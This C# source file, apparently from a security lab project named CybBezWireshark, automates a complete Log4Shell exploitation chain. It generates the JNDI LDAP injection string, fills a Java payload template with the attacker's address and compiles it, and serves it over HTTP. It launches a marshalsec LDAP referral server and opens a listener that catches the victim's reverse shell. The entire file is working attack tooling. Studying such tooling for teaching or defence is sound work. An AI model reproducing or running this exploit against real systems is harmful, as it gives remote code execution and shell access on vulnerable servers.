using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Microsoft.Extensions.Configuration;

namespace CybBezWireshark
{
    internal class Log4Shell
    {        
        public event Action<string>? ErrorLog;
        public event Action<string, StreamReader, StreamWriter>? AcceptConnection;

        private string jdkPath;
        private string networkAdapterName;

        private Process payloadCodeBaseServer;
        private Process ldapServer;

        private Socket reverseSellServer;
        private Socket client;

        private NetworkStream netStream;
        private StreamReader reader;
        private StreamWriter writer;

        public int PayloadCodeBaseServerPort { get; set; }
        public int LdapServerPort { get; set; }
        public int ReverseShellListenerPort { get; set; }
        public bool ShowTerminals { get; set; }
        public bool IsRunning { get; private set; } = false;
        public string LocalIPAddress { get; private set; }

        public Log4Shell(IConfiguration config)
        {
            jdkPath = config.GetValue<string>("jdkPath");
            networkAdapterName = config.GetValue<string>("networkAdapterName");

            SetLocalIp();
        }

        public string GetInjection() => $"${{jndi:ldap://{LocalIPAddress}:{LdapServerPort}/Run}}";

        public void Start()
        {
            try
            {
                CreatePayloadFile();
                CompliePayload();
                StartPayloadCodeBaseServer();
                StartLdapServer();
                StartReverseShellServer();
            }
            catch (Exception ex)
            {
                ErrorLog?.Invoke(ex.ToString());
            }

            IsRunning = true;
        }

        private void StartReverseShellServer()
        {
            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, ReverseShellListenerPort);
            reverseSellServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            reverseSellServer.Bind(ipe);
            reverseSellServer.Listen(1);
            reverseSellServer.BeginAccept(AcceptCallback, reverseSellServer);

            void AcceptCallback(IAsyncResult ar)
            {
                netStream?.Dispose();
                reader?.Dispose();
                writer?.Dispose();
                client?.Close();
                client?.Dispose();

                Socket listener = (Socket)ar.AsyncState;

                try
                {
                    client = listener.EndAccept(ar);
                }
                catch { return; }

                netStream = new NetworkStream(client);
                reader = new StreamReader(netStream);
                writer = new StreamWriter(netStream);

                AcceptConnection?.Invoke(((IPEndPoint)client.RemoteEndPoint).Address.ToString(), reader, writer);
            }
        }

        private void StartLdapServer()
        {
            ldapServer = new Process();
            ldapServer.StartInfo.FileName = $"{jdkPath}\\bin\\java.exe";
            ldapServer.StartInfo.Arguments = $"-cp Resources\\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{LocalIPAddress}:{PayloadCodeBaseServerPort}/CodeBase/#Run {LdapServerPort}";
            ldapServer.StartInfo.CreateNoWindow = !ShowTerminals;

            ldapServer.Start();
        }

        private void SetLocalIp()
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            LocalIPAddress = interfaces.First(i => i.Name == networkAdapterName).GetIPProperties().UnicastAddresses
                                       .First(a => a.Address.AddressFamily == AddressFamily.InterNetwork).Address
                                       .ToString();
        }

        private void CreatePayloadFile()
        {
            var code = File.ReadAllText("Resources\\Run.java");
            code = code.Replace("{ADDRESS}", LocalIPAddress);
            code = code.Replace("{PORT}", ReverseShellListenerPort.ToString());
            File.WriteAllText($"{Path.GetTempPath()}Run.java", code);
        }

        private void StartPayloadCodeBaseServer()
        {
            payloadCodeBaseServer = new Process();
            payloadCodeBaseServer.StartInfo.FileName = $"Resources\\PayloadCodeBaseServer.exe";
            payloadCodeBaseServer.StartInfo.Arguments = $"--urls http://*:{PayloadCodeBaseServerPort} {Path.GetTempPath()}Log4Shell";
            payloadCodeBaseServer.StartInfo.CreateNoWindow = !ShowTerminals;
            payloadCodeBaseServer.StartInfo.RedirectStandardError = true;
            payloadCodeBaseServer.ErrorDataReceived += (sender, e) => ErrorLog?.Invoke($"PayloadCodeBaseServer: {e.Data}");

            payloadCodeBaseServer.Start();
            //payloadCodeBaseServer.WaitForExit();

            //var a =  payloadCodeBaseServer.StandardError.ReadToEnd();
        }

        private void CompliePayload()
        {
            using var p = new Process();
            p.StartInfo.FileName = $"{jdkPath}\\bin\\javac.exe";
            p.StartInfo.Arguments = $"{Path.GetTempPath()}Run.java -d {Path.GetTempPath()}Log4Shell\\";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardError = true;

            p.Start();
            p.WaitForExit();

            var e = p.StandardError.ReadToEnd();
            if (!String.IsNullOrWhiteSpace(e))
            {
                throw new Exception(e);
            }
        }

        public void Stop()
        {
            payloadCodeBaseServer?.Kill();
            payloadCodeBaseServer?.Dispose();

            ldapServer?.Kill();
            ldapServer?.Dispose();

            reverseSellServer?.Close();
            reverseSellServer?.Dispose();

            client?.Close();
            client?.Dispose();

            netStream?.Dispose();
            reader?.Dispose();
            writer?.Dispose();

            IsRunning = false;
        }
    }
}
